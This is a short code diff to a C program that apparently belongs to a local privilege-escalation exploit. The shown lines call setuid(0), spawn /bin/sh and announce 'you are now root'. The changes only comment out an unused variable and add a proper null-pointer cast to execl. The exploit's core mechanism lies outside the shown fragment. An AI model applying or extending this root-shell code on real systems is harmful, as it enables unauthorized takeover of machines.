@@ -44,7 +44,7 @@ int main(int argc, char * argv[]){
         //FIND USER
         register struct passwd *pw;
         register uid_t uid;
-        int c;
+        // int c;
         uid = geteuid ();
         pw = getpwuid (uid);
         if (pw){
@@ -78,7 +78,7 @@ int main(int argc, char * argv[]){
                 scanf("%c", &answer);
                 if(answer=='Y' || answer == 'y'){
                         setgid(0); setuid(0);
-                        execl("/bin/sh","sh",0);
+                        execl("/bin/sh","sh", (char *)0);
                         puts("[+] If it worked, you are now root and should see an #. Try to do whoami to see which user you are.");
                 }else{puts("[i] Very well. Going to continue my job then.");}
         }
